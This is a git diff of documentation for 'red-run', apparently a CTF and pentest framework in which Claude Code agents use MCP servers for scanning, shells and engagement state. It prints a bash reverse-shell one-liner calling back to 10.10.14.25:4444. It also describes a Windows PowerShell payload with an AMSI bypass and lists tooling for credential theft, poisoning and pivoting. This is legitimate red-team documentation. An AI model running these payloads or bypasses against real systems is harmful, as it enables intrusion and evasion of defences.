@@ -2,11 +2,11 @@
 
 red-run uses five MCP (Model Context Protocol) servers to give agents access to capabilities that Claude Code's built-in tools can't provide: network scanning, persistent shell sessions, browser automation, semantic skill search, and engagement state management.
 
-MCP servers run as local processes, started automatically by Claude Code when you open a session in the repo directory. Each server exposes tools that agents call during skill execution.
+Most MCP servers run as local stdio processes, started automatically by Claude Code. The exception is **shell-server**, which runs as a persistent SSE service on `127.0.0.1:8022` so all teammates share the same sessions. `run.sh` starts shell-server before launching Claude Code.
 
 ## Configuration
 
-All servers are configured in `.mcp.json` at the repo root:
+Servers are configured in `.mcp.json` at the repo root. Most use stdio transport (command-based), shell-server uses SSE (URL-based):
 
 ```json
 {
@@ -21,33 +21,22 @@ All servers are configured in `.mcp.json` at the repo root:
       "args": ["run", "--directory", "tools/nmap-server", "python", "server.py"]
     },
     "shell-server": {
-      "command": "uv",
-      "args": ["run", "--directory", "tools/shell-server", "python", "server.py"]
+      "type": "sse",
+      "url": "http://127.0.0.1:8022/sse"
     },
     "browser-server": {
       "command": "uv",
       "args": ["run", "--directory", "tools/browser-server", "python", "server.py"]
     },
-    "state-reader": {
+    "state": {
       "command": "uv",
-      "args": ["run", "--directory", "tools/state-server", "python", "server.py",
-               "--mode", "read"]
-    },
-    "state-interim": {
-      "command": "uv",
-      "args": ["run", "--directory", "tools/state-server", "python", "server.py",
-               "--mode", "interim"]
-    },
-    "state-writer": {
-      "command": "uv",
-      "args": ["run", "--directory", "tools/state-server", "python", "server.py",
-               "--mode", "write"]
+      "args": ["run", "--directory", "tools/state-server", "python", "server.py"]
     }
   }
 }
 ```
 
-> **Note:** The state-server runs as three separate instances with different `--mode` flags. All three share the same `engagement/state.db` file. See [Engagement State](engagement-state.md) for details.
+All MCP server tools are pre-allowed in `.claude/settings.json` to reduce permission prompt noise.
 
 ---
 
@@ -104,52 +93,67 @@ Runs nmap inside a Docker container with minimal capabilities — no sudo needed
 
 ## shell-server
 
-**Location:** `tools/shell-server/` · **7 tools**
+**Location:** `tools/shell-server/` · **7 tools** · **SSE transport (shared sessions)**
 
-Manages TCP listeners, reverse shell sessions, and local interactive processes. Solves the persistent shell problem — Claude Code's Bash tool runs each command as a separate process, so interactive shells and credential-based access tools have no way to maintain state between calls.
+Manages TCP listeners, reverse shell sessions, and local interactive processes. Runs as a persistent SSE service on `127.0.0.1:8022` — all teammates share one instance, so sessions created by one teammate are visible to all others. Started automatically by `run.sh` before Claude Code launches.
 
 | Tool | Description |
 |------|-------------|
-| `start_listener(port, host="0.0.0.0", timeout=300, label?)` | Start TCP listener, wait for reverse shell |
+| `start_listener(port, host="0.0.0.0", timeout=300, label?)` | Start TCP listener, return reverse shell payloads for Linux and Windows |
 | `start_process(command, label?, timeout=30, privileged=false)` | Spawn local interactive process in a persistent PTY |
 | `send_command(session_id, command, timeout=10, expect?)` | Send command to session, return output |
 | `read_output(session_id, timeout=2)` | Read buffered output without sending a command |
-| `stabilize_shell(session_id, method="auto")` | Upgrade raw shell to interactive PTY |
-| `list_sessions()` | List all listeners and sessions with status |
+| `stabilize_shell(session_id, method="auto")` | Upgrade raw shell to interactive PTY (Linux only, skips on Windows) |
+| `list_sessions()` | List all listeners, sessions, and detected platform |
 | `close_session(session_id, save_transcript=true)` | Close session and save transcript |
 
 ### Reverse shell workflow
 
+`start_listener` returns ready-to-use payloads with the callback IP auto-resolved:
+
 ```
-start_listener(port=4444)       → Wait for callback
-# ... agent sends reverse shell payload via RCE ...
-stabilize_shell(session_id)     → Upgrade to PTY
-send_command(session_id, "id")  → Interact
-close_session(session_id)       → Save transcript
+start_listener(port=4444)  → Returns:
+  payloads.linux:   "bash -i >& /dev/tcp/10.10.14.25/4444 0>&1"
+  payloads.windows: "powershell -c \"Start-Process ... (AMSI bypass + TCP shell)\""
 ```
+
+The Windows payload includes an AMSI bypass (for CTF-level Defender) and uses `Start-Process` to detach from the parent process (survives xp_cmdshell, cmd /c, scheduled tasks).
+
+### Platform auto-detection
+
+When a shell connects, the server probes the prompt and auto-detects the platform (Windows/Linux). This determines:
+- **Command separators** — `&` for Windows cmd.exe, `;` for Linux
+- **Stabilization** — PTY upgrade on Linux, skipped on Windows
+- **Marker parsing** — handles Windows cmd.exe echoing the wrapped command line
+
+### Session management endpoints
+
+Two HTTP endpoints (outside MCP) for `run.sh` session management:
+
+| Endpoint | Description |
+|----------|-------------|
+| `GET /status` | Returns active session count and details (for startup cleanup prompt) |
+| `POST /clear` | Closes all sessions and listeners |
 
 ### Docker mode (`privileged=true`)
 
-The `privileged` parameter runs commands inside the `red-run-shell` Docker container, which packages the tools that need persistent sessions or raw sockets:
+The `privileged` parameter runs commands inside the `red-run-shell` Docker container:
 
 | Category | Tools |
 |----------|-------|
 | Windows access | evil-winrm |
-| Impacket | psexec.py, wmiexec.py, smbexec.py, smbclient.py, mssqlclient.py |
+| Impacket | psexec.py, wmiexec.py, smbexec.py, smbclient.py, mssqlclient.py, dpapi.py |
+| DPAPI/EFS | dpapick3 (handles CAPI key containers that impacket can't parse) |
 | Pivoting | chisel, ligolo-ng proxy, socat |
 | Poisoning | Responder, mitm6 |
 | Capture | tcpdump |
 | SSH | openssh-client |
 
-Use `privileged=true` for Docker-only tools (evil-winrm, chisel, ligolo-ng) and for daemons needing raw sockets (Responder, mitm6, tcpdump). Containers run with `--network=host` to share the host's network namespace including VPN tunnels.
-
-### Shell stabilization
-
-`stabilize_shell` tries three methods in order: python3, python2, then `script(1)`. After stabilization, sets `TERM=xterm-256color` and configures terminal size.
+Containers run with `--network=host` to share the host's network namespace including VPN tunnels.
 
 ### Transcripts
 
-Every send/recv is logged in memory. On `close_session(save_transcript=true)`, the full transcript is written to `engagement/evidence/shell-{id}-{label}.log`.
+Every send/recv is logged in real-time to `engagement/evidence/shell-{id}-{label}.log`. On `close_session(save_transcript=true)`, the log path is returned.
 
 ---
 
@@ -185,19 +189,13 @@ Headless Chromium automation via Playwright. Handles CSRF tokens, session cookie
 
 ## state-server
 
-**Location:** `tools/state-server/` · **3 instances, up to 24 tools**
+**Location:** `tools/state-server/` · **1 instance, full read/write tools**
 
-SQLite-backed engagement state management. The same server runs as three instances in different modes — each exposes a different set of tools depending on the agent's role.
+SQLite-backed engagement state management. In agent teams mode, all writes are centralized through the **state-mgr teammate** — the sole writer to state.db. State-mgr applies LLM-level dedup, enforces provenance links (technique-vuln linkage, access chain provenance), and notifies the lead of new findings. Other teammates and the lead read state directly.
 
-| Mode | Instance | Used By | Access |
-|------|----------|---------|--------|
-| `read` | state-reader | (retained for fallback) | 8 read-only tools |
-| `interim` | state-interim | All agents | 8 read + 5 add-only writes |
-| `write` | state-writer | Orchestrator | 8 read + all write/update tools |
+SQLite WAL mode + `busy_timeout=5000` handles concurrent access safely. DB-level deduplication (UNIQUE constraints) remains as a safety net behind state-mgr's judgment.
 
-All three instances open the same `engagement/state.db`. SQLite WAL mode + `busy_timeout=5000` handles concurrency safely.
-
-See [Engagement State](engagement-state.md) for the full schema, mode architecture, and how state drives vulnerability chaining.
+See [Engagement State](engagement-state.md) for the full schema and how state drives vulnerability chaining.
 
 ---
 
